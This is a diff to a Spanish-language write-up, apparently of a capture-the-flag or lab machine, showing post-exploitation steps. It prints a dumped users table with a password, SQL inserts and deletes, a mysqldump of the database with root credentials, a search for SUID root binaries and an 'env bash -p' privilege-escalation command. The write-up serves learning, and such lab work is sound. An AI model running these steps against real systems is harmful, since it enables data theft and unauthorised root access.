@@ -72,30 +72,38 @@ select * from users;
 
 Aunque ya sabemos que existe una base de datos llamada register, pues aparece en config.php, obtenemos:
 
-`
+
 +----------+------------------+
 | username | passwd           |
 +----------+------------------+
 | dylan    | KJSDFG789FGSDF78 |
 +----------+------------------+
-` 
+
 
 Era información que ya teniamos, pero probaremos lo siguiente:
 `
 INSERT INTO users VALUES ('prueba','123456');
+`
+`
 INSERT INTO users VALUES ('prueba','123456');
+`
+`
 DELETE FROM users WHERE username='prueba1';
 `
+
 Todas las consultas fueron exitosas, por lo que podemos decir que tenemos control sobre esa base de datos, pues podemos crear y eliminar los que queramos. Al igual que hacer un:
+
 `
 mysqldump --databases register -u root -ppaso > datos.sql
 `
+
 Para obtener los datos.
 
 Aunque aún no fuimos capaces de escalar privilegios en la máquina. 
 
 
 `find / -perm -4000 -user root 2>/dev/null`
+
 
 `/usr/bin/env /bin/bash -p`
 
